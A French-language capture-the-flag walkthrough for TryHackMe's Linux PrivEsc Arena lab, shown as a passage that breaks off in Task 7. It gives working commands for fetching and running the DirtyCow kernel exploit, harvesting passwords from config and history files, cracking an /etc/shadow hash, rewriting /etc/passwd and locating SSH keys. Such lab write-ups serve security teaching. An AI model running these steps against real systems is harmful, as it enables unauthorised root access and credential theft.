<h1 id="linux-privesc-arena---solutions-complètes">Linux PrivEsc
Arena - Solutions Complètes</h1>
<h2 id="table-des-matières">Table des matières</h2>
<ul>
<li><a href="#task-1">Task 1 - Connexion</a></li>
<li><a href="#task-2">Task 2 - Deploy the vulnerable machine</a></li>
<li><a href="#task-3">Task 3 - Kernel Exploits</a></li>
<li><a href="#task-4">Task 4 - Stored Passwords (Config Files)</a></li>
<li><a href="#task-5">Task 5 - Stored Passwords (History)</a></li>
<li><a href="#task-6">Task 6 - Weak File Permissions</a></li>
<li><a href="#task-7">Task 7 - SSH Keys</a></li>
<li><a href="#task-8">Task 8 - Sudo (Shell Escaping)</a></li>
<li><a href="#task-9">Task 9 - Sudo (Abusing Intended
Functionality)</a></li>
<li><a href="#task-10">Task 10 - Sudo (LD_PRELOAD)</a></li>
<li><a href="#task-11">Task 11 - SUID (Shared Object Injection)</a></li>
<li><a href="#task-12">Task 12 - SUID (Symlinks)</a></li>
<li><a href="#task-13">Task 13 - SUID (Environment Variables
#1)</a></li>
<li><a href="#task-14">Task 14 - SUID (Environment Variables
#2)</a></li>
<li><a href="#task-15">Task 15 - Capabilities</a></li>
<li><a href="#task-16">Task 16 - Cron (Path)</a></li>
<li><a href="#task-17">Task 17 - Cron (Wildcards)</a></li>
<li><a href="#task-18">Task 18 - Cron (File Overwrite)</a></li>
<li><a href="#task-19">Task 19 - NFS Root Squashing</a></li>
</ul>
<hr />
<h2
id="task-1---optional-connecting-to-the-tryhackme-network"><a name="task-1"></a>Task
1 - [Optional] Connecting to the TryHackMe network</h2>
<h3 id="objectif"> Objectif</h3>
<p>Se connecter au réseau TryHackMe via OpenVPN ou utiliser
AttackBox.</p>
<h3 id="commandes"> Commandes</h3>
<p><strong>Option 1 : Via OpenVPN (depuis votre machine)</strong></p>
<div class="sourceCode" id="cb1"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Télécharger votre fichier de configuration OpenVPN depuis TryHackMe</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> openvpn votre-fichier.ovpn</span></code></pre></div>
<p><strong>Option 2 : Utiliser AttackBox</strong></p>
<div class="sourceCode" id="cb2"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Cliquer sur le bouton &quot;Start AttackBox&quot; dans TryHackMe</span></span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Pas de commande nécessaire</span></span></code></pre></div>
<h3 id="réponse"> Réponse</h3>
<p>Aucune réponse nécessaire - juste la connexion</p>
<hr />
<h2
id="task-2---deploy-the-vulnerable-machine"><a name="task-2"></a>Task 2
- Deploy the vulnerable machine</h2>
<h3 id="objectif-1"> Objectif</h3>
<p>Déployer la machine vulnérable et se connecter en SSH.</p>
<h3 id="commandes-1"> Commandes</h3>
<div class="sourceCode" id="cb3"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Une fois la machine déployée, attendre l&#39;IP</span></span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Se connecter en SSH avec les credentials fournis</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> user@MACHINE_IP</span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Username: user</span></span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Password: password321</span></span></code></pre></div>
<h3 id="réponse-1"> Réponse</h3>
<p>Aucune réponse nécessaire - juste se connecter</p>
<hr />
<h2
id="task-3---privilege-escalation---kernel-exploits"><a name="task-3"></a>Task
3 - Privilege Escalation - Kernel Exploits</h2>
<h3 id="objectif-2"> Objectif</h3>
<p>Exploiter une vulnérabilité du kernel Linux pour obtenir root.</p>
<h3 id="commandes-2"> Commandes</h3>
<div class="sourceCode" id="cb4"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Vérifier la version du kernel</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="fu">uname</span> <span class="at">-a</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="co"># ou</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /proc/version</span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Chercher l&#39;exploit approprié</span></span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="co"># La machine utilise Linux 2.6.x, vulnérable à DirtyCow</span></span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Télécharger l&#39;exploit DirtyCow</span></span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /tmp</span>
<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</span>
<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Ou utiliser l&#39;exploit déjà présent sur la machine</span></span>
<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /home/user/tools/kernel-exploits/dirtycow</span>
<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Compiler l&#39;exploit</span></span>
<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="fu">gcc</span> <span class="at">-pthread</span> dirty.c <span class="at">-o</span> dirty <span class="at">-lcrypt</span></span>
<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Exécuter l&#39;exploit</span></span>
<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a><span class="ex">./dirty</span></span>
<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Entrer un nouveau mot de passe quand demandé</span></span>
<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a><span class="co"># Password: password</span></span>
<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Se connecter avec le nouveau compte root</span></span>
<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a><span class="fu">su</span> firefart</span>
<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a><span class="co"># Password: password</span></span>
<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. Vérifier que vous êtes root</span></span>
<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span></code></pre></div>
<h3 id="détails-techniques"> Détails techniques</h3>
<ul>
<li><strong>Vulnérabilité</strong>: CVE-2016-5195 (Dirty COW)</li>
<li><strong>Kernel affecté</strong>: Linux Kernel 2.6.22 &lt; 3.9</li>
<li><strong>Principe</strong>: Race condition dans la gestion de la
mémoire (Copy-On-Write)</li>
</ul>
<h3 id="réponse-2"> Réponse</h3>
<p>La réponse dépend de la question posée, généralement le flag se
trouve dans <code>/root/flag.txt</code></p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span></code></pre></div>
<hr />
<h2
id="task-4---privilege-escalation---stored-passwords-config-files"><a name="task-4"></a>Task
4 - Privilege Escalation - Stored Passwords (Config Files)</h2>
<h3 id="objectif-3"> Objectif</h3>
<p>Trouver des mots de passe stockés dans des fichiers de
configuration.</p>
<h3 id="commandes-3"> Commandes</h3>
<div class="sourceCode" id="cb6"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Chercher des fichiers de configuration avec des mots de passe</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /home/user/myvpn.ovpn</span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="co"># ou</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> <span class="at">-r</span> <span class="st">&quot;password&quot;</span> /home/user/ <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Chercher dans les fichiers de configuration communs</span></span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> ~/.bashrc</span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> ~/.bash_profile</span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> ~/.bash_history</span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> ~/.<span class="pp">*</span>history</span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Chercher dans les fichiers de configuration système</span></span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /etc/ <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-i</span> conf</span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/openvpn/auth.txt  <span class="co"># Souvent utilisé pour VPN</span></span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Chercher dans les scripts</span></span>
<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> /home <span class="at">-name</span> <span class="st">&quot;*.sh&quot;</span> <span class="at">-exec</span> grep <span class="at">-i</span> <span class="st">&quot;password\|pass&quot;</span> {} <span class="dt">\;</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Une fois le mot de passe root trouvé</span></span>
<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a><span class="fu">su</span> root</span>
<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a><span class="co"># Password: password123 (ou celui trouvé)</span></span>
<span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Lire le flag</span></span>
<span id="cb6-24"><a href="#cb6-24" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span></code></pre></div>
<h3 id="lieux-communs-pour-les-mots-de-passe"> Lieux communs pour les
mots de passe</h3>
<div class="sourceCode" id="cb7"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Fichiers de configuration VPN</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/home/user/myvpn.ovpn</span></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">/etc/openvpn/auth.txt</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Fichiers de configuration</span></span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.bashrc</span></span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.profile</span></span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.bash_profile</span></span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Scripts personnalisés</span></span>
<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="ex">/home/user/*.sh</span></span>
<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/local/bin/*.sh</span></span>
<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Fichiers de configuration d&#39;applications</span></span>
<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.config/</span></span>
<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.ssh/config</span></span></code></pre></div>
<h3 id="réponse-3"> Réponse</h3>
<p>Le mot de passe root trouvé dans le fichier de configuration</p>
<hr />
<h2
id="task-5---privilege-escalation---stored-passwords-history"><a name="task-5"></a>Task
5 - Privilege Escalation - Stored Passwords (History)</h2>
<h3 id="objectif-4"> Objectif</h3>
<p>Trouver des mots de passe dans l’historique des commandes.</p>
<h3 id="commandes-4"> Commandes</h3>
<div class="sourceCode" id="cb8"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Vérifier l&#39;historique bash</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> ~/.bash_history</span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Chercher spécifiquement des commandes avec des mots de passe</span></span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> ~/.bash_history <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-i</span> <span class="st">&quot;password\|passwd\|pwd&quot;</span></span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Vérifier d&#39;autres historiques</span></span>
<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> ~/.zsh_history</span>
<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> ~/.mysql_history</span>
<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> ~/.nano_history</span>
<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Chercher dans l&#39;historique de tous les utilisateurs (si possible)</span></span>
<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /home/<span class="pp">*</span>/.bash_history <span class="dv">2</span><span class="op">&gt;</span>/dev/null <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-i</span> <span class="st">&quot;password&quot;</span></span>
<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Chercher des commandes MySQL avec mot de passe</span></span>
<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> ~/.mysql_history <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-i</span> <span class="st">&quot;password&quot;</span></span>
<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a><span class="co"># Exemple de ce qu&#39;on peut trouver :</span></span>
<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a><span class="co"># mysql -h somehost.local -uroot -ppassword123</span></span>
<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Utiliser le mot de passe trouvé</span></span>
<span id="cb8-22"><a href="#cb8-22" aria-hidden="true" tabindex="-1"></a><span class="fu">su</span> root</span>
<span id="cb8-23"><a href="#cb8-23" aria-hidden="true" tabindex="-1"></a><span class="co"># Password: password123</span></span>
<span id="cb8-24"><a href="#cb8-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-25"><a href="#cb8-25" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Lire le flag</span></span>
<span id="cb8-26"><a href="#cb8-26" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span></code></pre></div>
<h3 id="commandes-dangereuses-à-chercher-dans-lhistorique"> Commandes
dangereuses à chercher dans l’historique</h3>
<div class="sourceCode" id="cb9"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co"># MySQL</span></span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span> <span class="at">-u</span> root <span class="at">-pPASSWORD</span></span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span> <span class="at">--password</span><span class="op">=</span>PASSWORD</span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="co"># SSH</span></span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="ex">sshpass</span> <span class="at">-p</span> <span class="st">&#39;PASSWORD&#39;</span> ssh user@host</span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="co"># FTP</span></span>
<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="fu">ftp</span> user:PASSWORD@host</span>
<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Curl/Wget avec auth</span></span>
<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-u</span> user:PASSWORD http://site</span>
<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Variables d&#39;environnement</span></span>
<span id="cb9-15"><a href="#cb9-15" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">PASSWORD</span><span class="op">=</span>secret</span></code></pre></div>
<h3 id="réponse-4"> Réponse</h3>
<p>Le mot de passe trouvé dans l’historique des commandes</p>
<hr />
<h2
id="task-6---privilege-escalation---weak-file-permissions"><a name="task-6"></a>Task
6 - Privilege Escalation - Weak File Permissions</h2>
<h3 id="objectif-5"> Objectif</h3>
<p>Exploiter les permissions faibles sur <code>/etc/shadow</code> ou
<code>/etc/passwd</code>.</p>
<h3 id="commandes-5"> Commandes</h3>
<div class="sourceCode" id="cb10"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Vérifier les permissions de /etc/shadow</span></span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /etc/shadow</span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Si le fichier est lisible (permissions 644 au lieu de 640)</span></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Lire /etc/shadow</span></span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/shadow</span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Extraire le hash du mot de passe root</span></span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/shadow <span class="kw">|</span> <span class="fu">grep</span> root</span>
<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Copier le hash dans un fichier</span></span>
<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::&#39;</span> <span class="op">&gt;</span> hash.txt</span>
<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Utiliser john pour cracker le hash</span></span>
<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a><span class="ex">john</span> <span class="at">--wordlist</span><span class="op">=</span>/usr/share/wordlists/rockyou.txt hash.txt</span>
<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a><span class="co"># ou hashcat</span></span>
<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a><span class="ex">hashcat</span> <span class="at">-m</span> 1800 hash.txt /usr/share/wordlists/rockyou.txt</span>
<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE 2 : Si /etc/passwd est modifiable</span></span>
<span id="cb10-21"><a href="#cb10-21" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Vérifier les permissions de /etc/passwd</span></span>
<span id="cb10-22"><a href="#cb10-22" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /etc/passwd</span>
<span id="cb10-23"><a href="#cb10-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-24"><a href="#cb10-24" aria-hidden="true" tabindex="-1"></a><span class="co"># Si le fichier est modifiable (permissions 666 au lieu de 644)</span></span>
<span id="cb10-25"><a href="#cb10-25" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Générer un nouveau hash de mot de passe</span></span>
<span id="cb10-26"><a href="#cb10-26" aria-hidden="true" tabindex="-1"></a><span class="ex">openssl</span> passwd <span class="at">-1</span> <span class="at">-salt</span> xyz password123</span>
<span id="cb10-27"><a href="#cb10-27" aria-hidden="true" tabindex="-1"></a><span class="co"># Résultat: $1$xyz$F3QzWGa8D0rEJBiOC8kNm0</span></span>
<span id="cb10-28"><a href="#cb10-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-29"><a href="#cb10-29" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. Modifier /etc/passwd pour changer le mot de passe root</span></span>
<span id="cb10-30"><a href="#cb10-30" aria-hidden="true" tabindex="-1"></a><span class="co"># Remplacer le &#39;x&#39; dans la ligne root par le hash généré</span></span>
<span id="cb10-31"><a href="#cb10-31" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> /etc/passwd</span>
<span id="cb10-32"><a href="#cb10-32" aria-hidden="true" tabindex="-1"></a><span class="co"># Avant: root:x:0:0:root:/root:/bin/bash</span></span>
<span id="cb10-33"><a href="#cb10-33" aria-hidden="true" tabindex="-1"></a><span class="co"># Après:  root:$1$xyz$F3QzWGa8D0rEJBiOC8kNm0:0:0:root:/root:/bin/bash</span></span>
<span id="cb10-34"><a href="#cb10-34" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-35"><a href="#cb10-35" aria-hidden="true" tabindex="-1"></a><span class="co"># 9. Se connecter en tant que root</span></span>
<span id="cb10-36"><a href="#cb10-36" aria-hidden="true" tabindex="-1"></a><span class="fu">su</span> root</span>
<span id="cb10-37"><a href="#cb10-37" aria-hidden="true" tabindex="-1"></a><span class="co"># Password: password123</span></span>
<span id="cb10-38"><a href="#cb10-38" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-39"><a href="#cb10-39" aria-hidden="true" tabindex="-1"></a><span class="co"># 10. Lire le flag</span></span>
<span id="cb10-40"><a href="#cb10-40" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span></code></pre></div>
<h3 id="permissions-normales-vs-vulnérables"> Permissions normales vs
vulnérables</h3>
<p><strong>Permissions normales :</strong></p>
<div class="sourceCode" id="cb11"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r-----</span> 1 root shadow /etc/shadow  <span class="co"># Correct</span></span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> 1 root root   /etc/passwd  <span class="co"># Correct</span></span></code></pre></div>
<p><strong>Permissions vulnérables :</strong></p>
<div class="sourceCode" id="cb12"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> 1 root root /etc/shadow    <span class="co"># VULNÉRABLE (644)</span></span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-rw-rw-</span> 1 root root /etc/passwd    <span class="co"># VULNÉRABLE (666)</span></span></code></pre></div>
<h3 id="réponse-5"> Réponse</h3>
<p>Le mot de passe root cracké ou le flag après modification de
/etc/passwd</p>
<hr />
<h2
id="task-7---privilege-escalation---ssh-keys"><a name="task-7"></a>Task
7 - Privilege Escalation - SSH Keys</h2>
<h3 id="objectif-6"> Objectif</h3>
<p>Utiliser des clés SSH mal protégées pour obtenir un accès root.</p>
<h3 id="commandes-6"> Commandes</h3>
<div class="sourceCode" id="cb13"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Chercher des clés SSH privées</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-name</span> <span class="st">&quot;id_rsa&quot;</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-name</span> <span class="st">&quot;id_dsa&quot;</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-name</span> <span class="st">&quot;*.pem&quot;</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Chercher dans les répertoires communs</span></span>
